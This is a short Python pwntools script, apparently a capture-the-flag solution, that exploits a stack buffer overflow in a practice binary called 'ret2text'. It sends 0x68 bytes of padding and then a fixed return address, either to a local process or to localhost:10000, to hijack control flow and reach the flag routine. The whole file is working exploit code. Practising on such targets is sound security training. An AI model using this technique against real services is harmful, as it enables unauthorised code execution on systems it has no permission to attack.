#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./ret2text')
else:
    p = remote('localhost', 10000)
addr_target = 0x4006C4

pd = 'a' * 0x68
pd += p64(addr_target)
p.sendafter('get flag\n', pd)
p.interactive()

